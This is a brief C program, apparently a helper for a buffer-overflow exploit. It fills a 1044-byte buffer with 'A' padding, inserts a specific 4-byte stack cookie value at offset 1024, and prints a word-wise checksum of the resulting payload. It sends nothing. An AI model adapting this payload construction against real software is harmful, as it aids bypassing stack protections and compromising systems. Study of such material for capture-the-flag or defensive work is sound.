#include <stdio.h>
#include <string.h>

int main()
{
    int i;
    unsigned int sum = 1044;
    char overflow_send_buf[1044];

    char cookie_buf[4];
    char* toAdd = "1096102229";
    int cookie = atoi(toAdd);
    memcpy(cookie_buf, &cookie, 4);
    for (i = 0; i < 1024; i++)
    {
        overflow_send_buf[i] = '\x41';
    }
    for (i = 0; i < 4; i++)
    {
        overflow_send_buf[i+1024] = cookie_buf[i];
    }
    for (i = 0; i < 16; i++)
    {
        overflow_send_buf[i+1028] = '\x41';
    }
    for (i = 0; i < 1044; i+=4)
    {
        sum += *((int*)&overflow_send_buf[i]);
    }
    printf("%x\n", sum);
}
